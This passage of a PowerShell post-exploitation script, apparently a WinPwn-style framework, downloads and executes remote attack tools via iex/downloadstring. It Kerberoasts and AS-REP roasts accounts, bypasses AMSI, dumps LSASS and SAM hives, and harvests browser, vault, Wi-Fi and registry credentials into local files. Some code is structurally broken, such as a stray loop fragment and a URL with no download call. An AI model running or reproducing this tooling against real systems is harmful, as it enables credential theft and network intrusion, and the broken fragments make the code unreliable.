            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
            if(!$consoleoutput){Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" >> "C:\sh_adm_mtrx\seatbelt\seatbelt.txt"}else{Invoke-Seatbelt -Command "-group=all=full" -outfile="C:\sh_adm_mtrx\seatbelt\seatbelt.txt" }
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPackerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
            if(!$consoleoutput){
                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\ASreproasting.txt" 
                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:C:\sh_adm_mtrx\Kerbero\Kerberoasting_Rubeus.txt"   
            }
            else
            {
                Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
                Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
            }
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
            if(!$consoleoutput){
                Invoke-watson >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns.txt     
            }
            else
            {
                Invoke-watson
            }
           
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
            if(!$consoleoutput){
                Invoke-Sharpweb -command "all" >> C:\sh_adm_mtrx\Browsercredentials.txt
            }
            else
            {
                Invoke-Sharpweb -command "all"
            }     
            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
            if (isadmin)
            {
                if(!$consoleoutput){Invoke-SharpUp -command "audit" >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command "audit"}
            }
            else
            {
                if(!$consoleoutput){Invoke-SharpUp -command " " >> C:\sh_adm_mtrx\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " "}
            }

            if (isadmin)
            {               
                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                if(!$consoleoutput){
                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> C:\sh_adm_mtrx\Internalmonologue.txt                    
                }
                else
                {
                    Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
                }
             }
             else
             {

            return
        }    
        do
        {
function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}
function SessionGopher 
{
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $allsystems
	)
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path "C:\sh_adm_mtrx" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/segoph.ps1')
    $whole_domain = "yes"
    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
    {
            
	        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {              
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "C:\sh_adm_mtrx\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
            }
            else 
            {
                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> C:\sh_adm_mtrx\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
            }
    }
    else
    {
        $session = "yes"
	    if(!$noninteractive)
        {
            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
        }
            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
            {
                      Invoke-S3ssionGoph3r -Thorough >> C:\sh_adm_mtrx\SessionGopher.txt -Outfile
            }
            else 
            {
                      Invoke-S3ssionGoph3r >> C:\sh_adm_mtrx\SessionGopher.txt
            }
    }
    if ($noninteractive -and $consoleoutput)
    {
        if ($allsystems)
        {
            Invoke-S3ssionGoph3r -AllDomain
        }
        Invoke-S3ssionGoph3r -Thorough
    }
}
function Kittielocal 
{
    param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud,
        [Switch]
        $teamviewer
    )
    $currentPath = (Get-Item -Path "C:\sh_adm_mtrx" -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    AmsiBypass
    if ($noninteractive)
    {
        if ($credentialmanager)
        {
          iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
        if(!$consoleoutput){Invoke-WCMDump >> C:\sh_adm_mtrx\WCMCredentials.txt}else{Invoke-WCMDump}
        }
        if($mimikittie)
        {
            if (isadmin){if(!$consoleoutput){obfuskittiedump -noninteractive}else{obfuskittiedump -noninteractive -consoleoutput}}
        }
        if($rundll32lsass)
        {
            if(isadmin){if(!$consoleoutput){dumplsass -noninteractive}else{dumplsass -noninteractive -consoleoutput}}
        }
        if($lazagne)
        {
            if(!$consoleoutput){lazagnemodule -noninteractive}else{lazagnemodule -noninteractive -consoleoutput}
        }
        if($browsercredentials)
        {
            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
            if(!$consoleoutput){Invoke-Sharpweb -command "all" >> C:\sh_adm_mtrx\Browsercredentials.txt}else{Invoke-Sharpweb -command "all"}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittenz -noninteractive}else{kittenz -noninteractive -consoleoutput}
        }
        if($wificredentials)
        {
            if(isadmin){if(!$consoleoutput){wificreds}else{wificreds -noninteractive -consoleoutput}}
        }
        if ($samdump)
        {
            if(isadmin){if(!$consoleoutput){samfile}else{samfile -noninteractive -consoleoutput}}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){SharpCloud}else{SharpCloud -noninteractive -consoleoutput}
        }
        if ($teamviewer)
        {
            if(!$consoleoutput){decryptteamviewer}else{decryptteamviewer -consoleoutput -noninteractive}
        } 
        return
    }
}
function Localreconmodules
{
<#        
    #>
    #Local Reconning
    [CmdletBinding()]
    Param (
        [Switch]
        $consoleoutput,
        [Switch]
        $noninteractive   
    )                    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName   
    if ($noninteractive -and (!$consoleoutput))
    {
        generalrecon -noninteractive
        powershellsensitive -noninteractive
        browserpwn -noninteractive
        dotnet -noninteractive
        passhunt -local $true -noninteractive        
        sensitivefiles -noninteractive
        return;
    }
    elseif ($noninteractive -and $consoleoutput)
    {
        generalrecon -noninteractive -consoleoutput
        powershellsensitive -noninteractive -consoleoutput
        browserpwn -noninteractive -consoleoutput
        dotnet -noninteractive -consoleoutput         
        sensitivefiles -noninteractive -consoleoutput
        return;    
    }
    
    do
    {        
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
        Switch ($masterquestion) 
        {
             1{generalrecon}
             2{powershellsensitive}
             3{browserpwn}             
             4{passhunt -local $true}             
             5{sensitivefiles}
             6{morerecon}             
       }
    }
 While ($masterquestion -ne 7)
}
function Generalrecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
)
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName 
    if(!$consoleoutput)
    #Collecting usefull Informations
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
        systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
        Write-Host -ForegroundColor Yellow 'Getting Patches'
	    wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
        wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
	    Write-Host -ForegroundColor Yellow 'Getting environment variables'
        Get-ChildItem Env: | ft Key,Value >> "$currentPath\LocalRecon\Environmentvariables.txt"
	    Write-Host -ForegroundColor Yellow 'Getting connected drives'
        Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$currentPath\LocalRecon\Drives.txt"
        Write-Host -ForegroundColor Yellow 'Getting current user Privileges'
	    whoami /priv >> "$currentPath\LocalRecon\Privileges.txt"
        Get-LocalUser | ft Name,Enabled,LastLogon >> "$currentPath\LocalRecon\LocalUsers.txt"
        Write-Host -ForegroundColor Yellow 'Getting local Accounts/Users + Password policy'
	    net accounts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
        Get-LocalGroup | ft Name >> "$currentPath\LocalRecon\LocalGroups.txt"
	    Write-Host -ForegroundColor Yellow 'Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$currentPath\LocalRecon\Networkinterfaces.txt"
        Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$currentPath\LocalRecon\DNSServers.txt"
        Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
        Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
        netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
        Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version, Release -ErrorAction 0 | where { $_.PSChildName -match '^(?!S)\p{L}'} | select PSChildName, Version, Release >> "$currentPath\LocalRecon\InstalledDotNetVersions"
        Write-Host -ForegroundColor Yellow 'Getting Shares'
	    net share >> "$currentPath\LocalRecon\Networkshares.txt"
	    Write-Host -ForegroundColor Yellow 'Getting hosts file content'
	    get-content $env:windir\System32\drivers\etc\hosts | out-string  >> "$currentPath\LocalRecon\etc_Hosts_Content.txt"
	    Get-ChildItem -Path HKLM:\Software\*\Shell\open\command\ >> "$currentPath\LocalRecon\Test_for_Argument_Injection.txt"
	}
    else
    {
	    if(!$consoleoutput){Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096 >> "$currentPath\LocalRecon\Firewall_Rules.txt"}else{Get-firewallRule -enabled $true | sort direction,name | format-table -property Name,localPorts,direction | out-string -Width 4096}
	    $output = " Files with Full Control and Modify Access`r`n"
	    $output = $output +  "-----------------------------------------------------------`r`n"
    	    $files = get-childitem C:\
    	    foreach ($file in $files)
	        {
        	    try {
            	    $output = $output +  (get-childitem "C:\$file" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | 
            	    where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE"} | where {$_.filesystemrights -match "FullControl|Modify"} | 
            	    ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
            	    }
        	        catch{$output = $output +   "`nFailed to read more files`r`n"}
            }	    
	        {
        	    try 
		        {
            		$output = $output +  (Get-ChildItem -Recurse "C:\$folder" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  
            		where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE"}  | where {$_.filesystemrights -match "FullControl|Modify"} | 
            		select path,filesystemrights,IdentityReference |  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
             	}
            catch 
	        {
            	$output = $output +  "`nFailed to read more folders`r`n"
            }
            }
	    if(!$consoleoutput){$output >> "$currentPath\LocalRecon\Files_and_Folders_with_Full_Modify_Access.txt"}else{Write-Host "------->JAWS Recon";$output}
	    
	 Write-Host -ForegroundColor Yellow '-------> Checking for potential sensitive user files'
	 if(!$consoleoutput){get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string >> "$currentPath\LocalRecon\Potential_Sensitive_User_Files.txt"}else{get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string} 
     }
         if (($HKCU | test-path) -eq "True") 
     {
         if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
         {
        		if(!$consoleoutput){echo "AlwaysInstallElevated enabled on this host!" >> "$currentPath\Vulnerabilities\AlwaysInstallElevatedactive.txt"}else{Write-Host -ForegroundColor Red "AlwaysInstallElevated enabled on this host!"}
         }
     }
	 Write-Host -ForegroundColor Yellow '-------> Checking if IPv6 is active (mitm6 attacks)'
	 $IPV6 = $false
	 $arrInterfaces = (Get-WmiObject -class Win32_NetworkAdapterConfiguration -filter "ipenabled = TRUE").IPAddress
	 foreach ($i in $arrInterfaces) {$IPV6 = $IPV6 -or $i.contains(":")}
	 if(!$consoleoutput){if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC" >> "$currentPath\Vulnerabilities\IPv6_Enabled.txt" }}else{if ($IPV6){Write-Host 'IPv6 enabled, thats another vulnerability (mitm6)'; echo "IPv6 enabled, check all interfaces for the specific NIC"}
	 Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'
	 if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}
	 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
	 Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'
	 if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096} 
      # Collecting more information
        Write-Host -ForegroundColor Yellow '-------> Checking for accesible SAM/SYS Files'
        if(!$consoleoutput){
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\Vulnerabilities\SYS"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\Vulnerabilities\SYS"}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
        If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\repair\SAM"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\RegBack\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable at %SYSTEMROOT%\System32\config\SAM, looking for SYS?"}
        If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\repair\system, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\SYSTEM, looking for SAM?"}
        If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable at %SYSTEMROOT%\System32\config\RegBack\system, looking for SAM?"} 
     }
     Write-Host -ForegroundColor Yellow '-------> Checking Registry for potential passwords'
     if(!$consoleoutput){
     REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
     REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
     }
     else
     {
        REG QUERY HKLM /F "passwor" /t REG_SZ /S /K
        REG QUERY HKCU /F "password" /t REG_SZ /S /K
     }
     Write-Host -ForegroundColor Yellow '-------> Checking sensitive registry entries..'
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon')
	 {
	  if(!$consoleoutput){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"}else{reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"}
	 }
     if(!$consoleoutput){
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\Vulnerabilities\PuttySessions.txt"}
     If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\Vulnerabilities\VNCPassword.txt"}
     If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\Vulnerabilities\RealVNCPassword.txt"}

     If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
     }
     else
     {
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"}
        If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password"}
        If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password}
        If (Test-Path -Path C:\unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){Write-Host -ForegroundColor Yellow 'Unattended.xml Found at C:\Windows\Panther\Unattend\Unattend.xml, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep.inf){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep.inf, check it for passwords'}
        If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){Write-Host -ForegroundColor Yellow 'Sysprep.inf Found at C:\Windows\system32\sysprep\sysprep.xml, check it for passwords'}
     }
        if(!$consoleoutput){Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"}else{Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue}
	    
        Write-Host -ForegroundColor Yellow '-------> List running tasks'
        if(!$consoleoutput){Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"}else{Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize}

        Write-Host -ForegroundColor Yellow '-------> Checking for usable credentials (cmdkey /list)'
        if(!$consoleoutput){cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt"}else{cmdkey /list} # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
}
function Morerecon{
    Param (
[Switch]
$consoleoutput,
[Switch]
$noninteractive   
)
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (isadmin)
    {        
('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ComputerDetails.ps1')
            Write-Host -ForegroundColor Yellow '-------> Dumping general computer information '
        if(!$consoleoutput){Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"}else{Get-ComputerDetails}
    }
}
function Sensitivefiles{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
)    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # obfuscated + string replaced p0werview
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/find-interesting.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
        try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
        try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup >> "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
        Write-Verbose "Enumerating more interesting files..."
        $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
        $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
        GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
    }
    else
    {
        Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
        try{Find-InterestingFile -Path 'C:\'}catch{Write-Host ":-("}
        try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup }catch{Write-Host ":-("}
        Write-Verbose "Enumerating more interesting files..."
        $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
        $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
        $IndexedFiles |Format-List |Out-String -width 500 
        GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 
    }
}
function Browserpwn{
    Param (
   [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
)
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    $chrome = "yes"
    if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}
    if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
    {
        # Lee Christensen's Chrome-Dump Script
        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
        try
        {
            Install-SqlLiteAssembly
            if(!$consoleoutput){
                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
            }
            else{
                Get-ChromeDump
                Get-ChromeHistory
            }
            Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
        }
        catch{}
    }
    $IE = "yes"
    if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'}
    if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
    {
        [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault 
        if(!$consoleoutput){$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"}else{$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }}
    }
    $browserinfos = "yes"
